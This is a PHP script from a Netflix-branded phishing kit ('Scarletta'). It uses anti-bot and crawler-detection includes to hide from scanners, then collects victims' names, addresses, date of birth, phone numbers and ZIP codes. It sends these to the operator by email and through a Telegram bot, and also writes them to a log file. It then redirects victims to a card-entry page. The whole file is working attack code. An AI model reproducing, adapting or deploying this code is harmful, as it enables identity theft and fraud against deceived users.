<?php

ini_set('allow_url_fopen',1);


$useragent = $_SERVER['HTTP_USER_AGENT'];

session_start();

# Debug

if($settings['debug'] == "1"){
  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
};



include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
include("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../Logs/results.txt";
$client = file_get_contents("../../Logs/client.txt");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header('https://www.google.com/?q='.$settings['out']);
}

$firstname = $_POST['firstName'];
$lastname = $_POST['lastName'];
$adr = $_POST['al'];
$adr2 = $_POST['al2'];
$dob = $_POST['dob'];
$zip = $_POST['zip'];
$phone = $_POST['phone'];
$city = $_POST['city'];

if(empty($adr2)){
	$adr2 = "Not Available ❌";
}


$message = "==== 🔐 [ PERSONAL DETAILS | SCARLETTA | CLIENT {$client} ] 🔐 ====\n";
$message .= "|-------------------------------------|\n";
$message .= "| ➤ [ Firstname ]  : {$firstname}\n";
$message .= "| ➤ [ Lastname ] : {$lastname}\n";
$message .= "| ➤ [ Address ]  : {$adr}\n";
$message .= "| ➤ [ Address 2 ]  : {$adr2}\n";
$message .= "| ➤ [ Phone Number ] : +1{$phone}\n";
$message .= "| ➤ [ City ] : {$city}\n";
$message .= "| ➤ [ ZIP Code ] : {$zip}\n";
$message .= "| ➤ [ DoB ]  : {$dob}\n";
$message .= "|-------------------------------------|\n";
$message .= "\n📺 ===== [ 💰 NETFLIX101 | SCARLETTA 💰 ] ===== 📺\n\n";

if ($settings['send_mail'] == "1"){
	$to = $owner;
  $client = file_get_contents("../../Logs/client.txt");
	$headers = "Content-type:text/plain;charset=UTF-8\r\n";
	$headers .= "From: Scarletta <netflix@client_{$client}_site.com>\r\n";
	$subject = "⚔️ {$email} ✦ A C C C E S S ✦ Log #{$client} ⚔️";
	$msg = $message;
	mail($to, $subject, $msg, $headers);
}

$client = file_get_contents("../../Logs/client.txt");


if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}



# Head Back To Next Step
header('Location: card.php');
?>